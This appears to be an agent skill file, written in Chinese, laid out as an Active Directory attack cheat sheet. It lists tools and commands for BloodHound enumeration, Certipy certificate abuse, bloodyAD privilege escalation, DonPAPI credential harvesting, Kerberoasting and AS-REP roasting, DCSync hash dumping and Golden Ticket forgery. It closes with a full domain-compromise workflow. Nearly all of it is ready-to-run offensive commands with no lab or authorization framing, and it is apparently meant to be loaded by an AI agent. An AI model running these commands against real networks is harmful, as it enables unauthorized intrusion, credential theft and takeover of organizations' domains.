---
name: active-directory
description: Active Directory攻击 — BloodHound、Certipy、bloodyAD、DonPAPI、域渗透
version: 1.0.0
author: Hermes Agent
license: MIT
metadata:
  hermes:
    tags: [active-directory, bloodhound, kerberos, certipy, domain, windows, ldap]
---

# Active Directory攻击工具链

## 核心工具

| 工具 | 用途 | Stars |
|------|------|-------|
| **BloodHound** | AD攻击路径分析 | 10K+ |
| **BloodHound.py** | Python版数据采集 | 3K+ |
| **Certipy** | AD CS证书攻击 | 3K+ |
| **bloodyAD** | AD权限提升瑞士军刀 | 2K+ |
| **DonPAPI** | DPAPI远程凭据提取 | 1K+ |
| **Impacket** | Windows协议工具集 | 13K+ |
| **CrackMapExec** | 内网批量操作 | 10K+ |
| **Rubeus** | Kerberos攻击 | 3K+ |
| **PowerView** | AD枚举(PowerShell) | - |
| **PingCastle** | AD安全评估 | 2K+ |

---

## 1. BloodHound — AD攻击路径

### 安装
```bash
# Neo4j
sudo apt install neo4j
sudo systemctl start neo4j

# BloodHound (Docker)
docker pull specterops/bloodhound
docker run -p 7474:7474 -p 7687:7687 specterops/bloodhound

# Python采集器
pip install bloodhound
```

### 数据采集
```bash
# BloodHound.py
bloodhound-python -u user -p pass -d domain.local -dc dc.domain.local -c All

# SharpHound (Windows)
# 或用CME
cme ldap dc.domain.local -u user -p pass --bloodhound --collection All
```

### 常用查询
```
1. Find all Domain Admins
2. Find Shortest Path to Domain Admin
3. Find Principals with DCSync Rights
4. Find Kerberoastable Users
5. Find AS-REP Roastable Users
6. Find Computers with Unconstrained Delegation
7. Find Users with AdminCount=1
```

---

## 2. Certipy — AD CS证书攻击

### 安装
```bash
pip install certipy-ad
```

### ESC1 — 模板配置错误
```bash
# 枚举漏洞模板
certipy find -u user@domain -p pass -dc-ip DC_IP -vulnerable

# 请求管理员证书
certipy req -u user@domain -p pass -ca CA_NAME -template VULN_TEMPLATE -upn admin@domain

# 用证书认证
certipy auth -pfx admin.pfx -dc-ip DC_IP
```

### ESC4 — 模板写权限
```bash
# 修改模板使ESC1可利用
certipy template -u user@domain -p pass -template VULN_TEMPLATE -save-old
certipy req -u user@domain -p pass -ca CA_NAME -template VULN_TEMPLATE -upn admin@domain
certipy template -u user@domain -p pass -template VULN_TEMPLATE -configuration template.json
```

### ESC8 — NTLM Relay to AD CS
```bash
# 启动HTTP服务器
certipy relay -target http://CA_SERVER

# 用Responder捕获NTLM
sudo responder -I eth0 -wrf

# 中继到AD CS获取证书
```

---

## 3. bloodyAD — AD权限提升

### 安装
```bash
pip install bloodyAD
```

### 用法
```bash
# 设置密码
bloodyAD --host DC_IP -d domain.local -u user -p :nthash set password target 'NewPass!'

# 添加用户到组
bloodyAD --host DC_IP -d domain.local -u user -p 'Pass' add groupMember "Domain Admins" target

# 添加计算机
bloodyAD --host DC_IP -d domain.local -u user -p 'Pass' add computer NEWPC 'Password123!'

# 修改SPN(用于Kerberoasting)
bloodyAD --host DC_IP -d domain.local -u user -p 'Pass' set spn target HTTP/fake

# 添加DNS记录
bloodyAD --host DC_IP -d domain.local -u user -p 'Pass' add dnsRecord fakehost 10.10.10.100

# 通过SOCKS代理
bloodyAD --host DC_IP -d domain.local -u user -p 'Pass' -k set password target 'NewPass!'
```

---

## 4. DonPAPI — DPAPI凭据提取

### 安装
```bash
pipx install donpapi
```

### 用法
```bash
# 收集所有凭据
donpapi collect -u admin -p 'Pass' -d domain.local -t ALL --fetch-pvk

# 收集指定目标
donpapi collect -u admin -p 'Pass' -d domain.local -t 192.168.1.100

# 查看结果
donpapi file db.dpapi

# Web GUI
donpapi gui
```

### 收集的凭据类型
```
- 浏览器密码/Cookie
- 证书
- Credential Manager
- SCCM凭据
- VNC凭据
- WiFi密码
- RDCManager凭据
- Windows Vault
```

---

## 5. AD枚举

### PowerView (PowerShell)
```powershell
# 域信息
Get-Domain
Get-DomainController

# 用户枚举
Get-DomainUser
Get-DomainUser -Identity admin -Properties *
Get-DomainUser -SPN   # Kerberoastable

# 组枚举
Get-DomainGroup
Get-DomainGroupMember -Identity "Domain Admins"

# 计算机枚举
Get-DomainComputer
Get-DomainComputer -Unconstrained  # 无约束委托

# GPO
Get-DomainGPO
Get-DomainGPOLocalGroup

# ACL
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner"}
```

### ldapdomaindump
```bash
pip install ldapdomaindump
ldapdomaindump -u domain\\user -p pass ldap://DC_IP
```

---

## 6. Kerberos攻击

### AS-REP Roasting
```bash
# 无需密码
GetNPUsers.py domain.com/ -usersfile users.txt -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt wordlist.txt

# bloodyAD
bloodyAD --host DC_IP -d domain.local -u user -p 'Pass' get writable --otype user --right WRITE_PROPERTY | grep -i "USER_ACCOUNT_CONTROL"
```

### Kerberoasting
```bash
# Impacket
GetUserSPNs.py domain.com/user:pass -request -outputfile tgs.txt
hashcat -m 13100 tgs.txt wordlist.txt

# Rubeus
Rubeus.exe kerberoast /outfile:tgs.txt
```

### Unconstrained Delegation
```bash
# 监控传入的TGT
Rubeus.exe monitor /interval:5

# 强制目标连接(打印机bug)
SpoolSample.exe TARGET ATTACKER
```

---

## 7. DCSync

### 导出所有hash
```bash
secretsdump.py domain.com/user:pass@DC_IP
secretsdump.py -just-dc domain.com/user:pass@DC_IP

# 只导出krbtgt
secretsdump.py -just-dc-user krbtgt domain.com/user:pass@DC_IP
```

### Golden Ticket
```bash
# 用krbtgt hash
ticketer.py -nthash krbtgt_NTHASH -domain-sid S-1-5-21-... -domain domain.com administrator
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain.com/administrator@DC_IP
```

---

## 8. 域渗透流程

```
1. 枚举
   ├── BloodHound采集数据
   ├── PowerView枚举用户/组/计算机
   └── ldapdomaindump导出LDAP信息

2. 凭据获取
   ├── AS-REP Roasting
   ├── Kerberoasting
   ├── AD CS证书攻击
   └── DonPAPI DPAPI提取

3. 权限提升
   ├── bloodyAD修改密码/添加组
   ├── ACL滥用
   └── Unconstrained Delegation

4. 横向移动
   ├── Pass-the-Hash
   ├── Pass-the-Ticket
   ├── Over-Pass-the-Hash
   └── NTLM Relay

5. 域控获取
   ├── DCSync导出hash
   ├── Golden/Silver Ticket
   └── AD CS证书伪造
```

---

## Pitfalls

1. **BloodHound需要Neo4j** — 记得启动neo4j服务
2. **Certipy版本问题** — 确保pip install certipy-ad不是certipy
3. **bloodyAD需要LDAP访问** — 确保445/389/636端口可达
4. **DCSync需要高权限** — 需要Domain Admin或等效权限
5. **Golden Ticket需要krbtgt hash** — 必须先拿到域控
6. **Kerberoasting只能获取服务账号** — 不是所有用户
7. **AS-REP Roasting需要禁用预认证的用户** — 不是所有用户
8. **DPAPI凭据需要解密密钥** — 需要用户密码或DPAPI backup key
